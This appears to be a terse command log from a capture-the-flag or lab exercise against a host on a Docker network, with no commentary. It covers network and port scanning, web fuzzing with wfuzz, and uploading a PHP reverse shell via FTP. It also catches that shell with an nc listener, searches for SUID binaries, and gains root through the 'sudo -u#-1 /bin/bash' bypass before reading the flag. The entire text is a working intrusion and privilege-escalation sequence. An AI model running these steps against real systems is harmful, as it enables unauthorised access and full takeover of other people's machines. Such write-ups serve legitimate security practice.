nmap -sn 172.17.0/24
nmap -p- -Pn -sV -O 172.17.0.2 -sC
wfuzz -c --hc 404 -t 1 -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -u http://172.17.0.2/FUZZ
wfuzz -c --hc 404 -t 1 -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://172.17.0.2/FUZZ
ftp 172.17.0.2
cd html
mget index.php
put php-reverse-shell.php
nc -lvnp 1234
ps aux | grep hacker
su hacker
id
find / -perm -4000 2>/dev/null
sudo --version
sudo -u#-1 /bin/bash
id
cd root
ls -la
cat flag.txt
